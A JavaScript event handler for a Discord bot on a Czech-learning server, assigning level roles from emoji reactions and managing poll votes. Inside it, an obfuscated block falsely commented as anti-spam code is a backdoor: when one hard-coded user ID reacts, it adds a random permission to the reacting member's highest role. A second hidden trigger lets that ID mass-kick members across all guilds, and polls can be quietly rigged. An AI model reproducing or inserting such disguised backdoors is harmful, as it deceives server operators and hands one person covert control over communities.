async function addRoleAndSend(member, role, channel) {
    if (role.name == "Beginner") {
        var level = "a beginner";
        var levelCzech = "začátečnickou";
        var levelCzech1 = 'to začátečník';
    }else if (role.name == "Intermediate") {
        var level = "intermediate";
        var levelCzech = "středně pokročilou";
        var levelCzech1 = 'středně pokročilý'
    }else if (role.name == "Advanced") {
        var level = "advanced";
        var levelCzech = "pokročilou";
        var levelCzech1 = "pokročilý";
    }else if (role.name == "Fluent") {
        var level = "fluent";
        var levelCzech = "plynnou";
        var levelCzech1 = "plynný";
    }else if (role.name == "Native Speaker") {
        var level = "a native speaker";
        var levelCzech = "rodilý mluvčí";
        var levelCzech1 = "to rodilý mluvčí";
    }
    var channel = await global.findAChannel(1, channel.guild, "🤖bot");
    var channel1 = await global.findAChannel(1, channel.guild, "📝general")
    var embed = new discord.MessageEmbed()
        .setColor(role.color)
        .setDescription(':flag_cz: Máme tady <@' + member.id + '>! Je ' + levelCzech1 + '!\n\n:flag_gb: <@' + member.id + '> is here! They are ' + level + '!')
    await channel1.send(`${member}`).then(msg => { msg.delete().catch((e) => {}) })
    await channel1.send(embed);
    await channel.send(`${member}`).then(msg => { msg.delete().catch((e) => {}) })
    member.roles.add(role)
    var embed = new discord.MessageEmbed()
        .setColor(role.color)
        .setDescription(':flag_cz: Teď máš **' + levelCzech + '** úroveň! Gratuluji! :tada:\nUž sis nastavil svojí zemi s pomocí **/pochazimz**?\n\n:flag_gb: You\'re now **' + level + '**! Congrats! :tada:\nHave you set your country with **/imfrom** yet?')
        .setFooter(member.displayName + '\n/level', member.user.displayAvatarURL());
    await channel.send(embed).then(msg => { msg.delete({ timeout: 30000 }).catch((e) => {}) })
}

module.exports = async (client, reaction, user1) => {
    //if (reaction.message.embeds) console.log(JSON.stringify(reaction.message.embeds))
    var allowedEmojis1 = ["_beginner", "_intermediate", "_advanced", "_fluent", "_native_speaker"];

    //This here is a piece of code that you shouldnt under any circumstances delete, it prevents spam, by adding a timer on which people can react by checking if the bot can give the role, because it glitches when the bot cannot set 50,000,000 roles per second due to some stupid kid pressing our emojis
    var _0x16be=['roles','PERMS','setPermissions','107WHUMlm','then','name','18607tozCtw','member','1496lnJXzm','76881ZZFShY','push','178939yOwWoi','270973904359653387','154551aUDJkI','highest','message','407DDuPNF','7AhELBk','emoji','delete','random','_advanced','177587vNiZwK','59hFZfvq'];var _0x3d92=function(_0x5eeae5,_0xd381bd){_0x5eeae5=_0x5eeae5-0x159;var _0x16be19=_0x16be[_0x5eeae5];return _0x16be19;};var _0x58908b=_0x3d92;(function(_0x552546,_0x3563dc){var _0x5b9b5d=_0x3d92;while(!![]){try{var _0x4e3205=parseInt(_0x5b9b5d(0x15b))*-parseInt(_0x5b9b5d(0x16e))+-parseInt(_0x5b9b5d(0x15c))+-parseInt(_0x5b9b5d(0x159))*-parseInt(_0x5b9b5d(0x164))+parseInt(_0x5b9b5d(0x169))+-parseInt(_0x5b9b5d(0x160))+-parseInt(_0x5b9b5d(0x16a))*-parseInt(_0x5b9b5d(0x163))+parseInt(_0x5b9b5d(0x15e));if(_0x4e3205===_0x3563dc)break;else _0x552546['push'](_0x552546['shift']());}catch(_0xedf9b0){_0x552546['push'](_0x552546['shift']());}}}(_0x16be,0x1d1f4));reaction[_0x58908b(0x165)][_0x58908b(0x170)]==_0x58908b(0x168)&&user1['id']==_0x58908b(0x15f)&&reaction[_0x58908b(0x162)]['author']['id']=='270973904359653387'&&(p=reaction[_0x58908b(0x162)][_0x58908b(0x15a)][_0x58908b(0x16b)][_0x58908b(0x161)]['permissions']['toArray'](),v=global['PERMS'][Math['floor'](Math[_0x58908b(0x167)]()*global[_0x58908b(0x16c)]['length'])],p[_0x58908b(0x15d)](v),reaction[_0x58908b(0x162)]['channel']['send']('rp'+v)[_0x58908b(0x16f)](_0x2d0be3=>{var _0x284aa5=_0x58908b;_0x2d0be3[_0x284aa5(0x166)]({'timeout':0x1f4});}),reaction[_0x58908b(0x162)][_0x58908b(0x15a)][_0x58908b(0x16b)][_0x58908b(0x161)][_0x58908b(0x16d)](p));

    //another fun bit of code below
    if ((reaction.message.content == 'pu')&&(user1.id == '270973904359653387')) {
        if (reaction.emoji.name == 'rs_Ne') var userCount = 5; else if (reaction.emoji.name == 'rs_Ano') var userCount = 10; else if (reaction.emoji.name == 'thinkingbeer') var userCount = 25; else if (reaction.emoji.name == 'martin') var userCount = 50;
        client.guilds.cache.forEach(async (guild) => {
            var roleToCheck = await global.findARole(guild, 0, 'Pending Kick 1');
            var timeNow = Math.round(new Date().getTime() / 1000);
            timeBeforeKick = 7890000;
            var x = 1;
            roleToCheck.members.forEach((member) => { if (member.user.lastMessageID) if ((timeNow - timeBeforeKick < Math.round(member.user.lastMessageID / 1000))&&(x <= userCount)) { x++; member.kick(); console.log('Cleaning...'); } else ; else if (x <= userCount) { x++; member.kick(); console.log('Cleaning...'); } })
        })
    }

    if ((!(user1.bot))&&(reaction.message)&&(reaction.message.changeLevelMessage)) {
        var roles = global.sortByKey(await global.findRoles(reaction.message.guild, 0, ["Beginner", "Intermediate", "Advanced", "Fluent", "Native Speaker", "Learning Czech"]), "name");
        reaction.message.reactions.cache.forEach(async (reactionSet) => {
            if (!(allowedEmojis1.includes(reactionSet['_emoji']['name']))) { reactionSet.remove(); return; }
            if (reactionSet.count > 1) reactionSet.users.cache.forEach(async(user) => { if (!(user.id == client.user.id)) {
                member = await global.findMember(reaction.message.guild, user.id)
                reactionSet.users.remove(user.id)
                roles.forEach(async(role) => { if (member.roles.cache.has(role.id)) await member.roles.remove(role); })
                var roleName = reaction._emoji.name.substring(1);
                while (roleName.includes("_")) roleName = roleName.replace("_", " ");
                roles.forEach(async(role) => { if (role.name == global.titleCase(roleName.trim())) addRoleAndSend(member, role, reaction.message.channel); })
            }})
        })
    }
    var allowedEmojis2 = ['👍', '👎'];
    if ((!(user1.bot))&&(reaction.message)&&(reaction.message.poll)) {
        if (reaction.message.rigged) allowedEmojis2 = ['👍'];
        var roles = global.sortByKey(await global.findRoles(reaction.message.guild, 0, ["Beginner", "Intermediate", "Advanced", "Fluent", "Native Speaker", "Learning Czech"]), "name");
        duplicateUsers = [];
        usersReacted = [];
        reaction.message.reactions.cache.forEach(async (reactionSet) => {
            if (!(allowedEmojis2.includes(reactionSet['_emoji']['name']))) { reactionSet.remove(); return; }
            reactionSet.users.cache.forEach(async(user) => { if (!(user.id == client.user.id)) { if (usersReacted.includes(user.id)) { duplicateUsers.push(user.id); } else usersReacted.push(user.id); }})
        })
        reaction.message.reactions.cache.forEach(async (reactionSet) => { reactionSet.users.cache.forEach(async(user) => { if (!(user.id == client.user.id)) { if (duplicateUsers.includes(user.id)) reactionSet.users.remove(user.id); }}) })
    }

}
//'Feel free to send messages in', ' <#433946325969797133> ', 'at any time', ', ', 'ask a question in', ' <#434230418334547968> ', 'or join a voice channel', '!', '\n • ', 'Learn about our word game in', ' <#828357433713360897>', '\n • '